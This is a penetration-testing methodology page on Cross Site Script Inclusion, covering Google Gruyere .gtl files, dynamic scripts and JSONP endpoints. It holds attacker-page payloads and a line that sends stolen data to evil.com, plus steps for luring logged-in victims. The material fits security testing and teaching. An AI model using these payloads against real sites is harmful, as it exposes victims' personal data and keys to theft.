# Cross Site Script Inclusion

## Check List

## Methodology

### Black Box

#### XSSI

{% stepper %}
{% step %}
During active reconnaissance, browse through the target application and identify files using the .gtl extension, which are Google Gruyere template files
{% endstep %}

{% step %}
Fuzz the application for .gtl files using a tool such as FFUF, and confirm the presence and accessibility of files such as feed.gtl. Accessing the discovered .gtl file should reveal sensitive information (APIKEY) exposed directly in the file contents
{% endstep %}

{% step %}
Create a malicious page on an attacker-controlled domain (attacker.com/CSSI.html) and insert the following script to extract the sensitive values through XSSI

```javascript
<script>
function _feed(a) {
    alert("private snippet of appspot from remote domain is : " + a['appspot']);
}
</script>

<script src="https://google-gruyere.appspot.com/603401276585510108589243280335984060786/feed.gtl"></script>
```
{% endstep %}

{% step %}
Use social engineering to lure a logged-in victim into visiting the attacker page (attacker.com/CSSI.html). When the victim loads the page while authenticated, the malicious script imports the .gtl file and leaks the sensitive information (such as APIKEY) to the attacker
{% endstep %}
{% endstepper %}

***

#### XSSI&#x20;

{% stepper %}
{% step %}
During initial analysis, review the target application and identify script files that may contain sensitive data. Pay special attention to dynamic JavaScript files or JSONP endpoints that return user-specific information when accessed by authenticated users
{% endstep %}

{% step %}
Verify whether the script is dynamic by sending two requests

* one with authenticated session cookies
* one without authentication
{% endstep %}

{% step %}
If the responses differ, the JavaScript file is dynamic and potentially vulnerable to XSSI. For example, the endpoint

```
https://example.com/p/?info=abc
```

returns user-specific information inside a callback function for authenticated users
{% endstep %}

{% step %}
Create a malicious HTML page on an attacker-controlled domain (attacker.com) and include the callback function and script import to capture the sensitive data

```html
<html>
<script>
function abc(s) {
    alert(JSON.stringify(s));
}
</script>

<script src="https://example.com/p/?info=abc"></script>
</html>
```
{% endstep %}

{% step %}
Use social engineering techniques to lure an authenticated user into visiting the malicious page (attacker.com/index.html). When the victim loads the page while logged in, the remote script is imported and executes in the attacker’s context, causing sensitive information (such as name, number, email, and address) to be exposed to the attacker
{% endstep %}
{% endstepper %}

***

#### XSSI And JSONP Bug

{% stepper %}
{% step %}
Begin by spidering the target application, using both manual navigation and automated crawling. Once responses are populated, filter results in your proxy tool (Burp Suite) by MIME type and review responses marked as script to identify JavaScript files potentially containing sensitive information
{% endstep %}

{% step %}
Inspect any discovered JavaScript files for embedded user data such as personal details, session-related identifiers, or other sensitive values. Confirm whether the script is returned without requiring CORS-triggering request headers such as Authorization, `X-API-KEY`, `X-CSRF-TOKEN`, or other custom authentication headers. If such headers are required, the browser may block cross-domain inclusion unless additional misconfigurations exist
{% endstep %}

{% step %}
Determine whether the script can be included cross-origin by verifying that it loads successfully when referenced in a simple tag. A basic structure would resemble

```javascript
<script src="https://target.com/vuln.js"></script>
<script defer>
// var_name is a variable inside vuln.js that contains exposed data
console.log(var_name);

// Example of exfiltration via request to an attacker-controlled server
fetch("https://evil.com/stealInfo?info=" + var_name);
</script>
```
{% endstep %}

{% step %}
Apply similar testing methodology for JSONP endpoints, using common callback parameters such as `callback=`, `jsonp=`, or `jsoncallback=` on endpoints that return dynamic user-specific content. Test variations because different endpoints often use distinct callback parameter names
{% endstep %}

{% step %}
Some endpoints require multiple parameters to trigger a JSONP response (`?type=jsonp&callback=test`)
{% endstep %}

{% step %}
Even if the response is labeled Content-Type: application/json, JSONP may still execute if X-Content-Type-Options: nosniff is not present
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
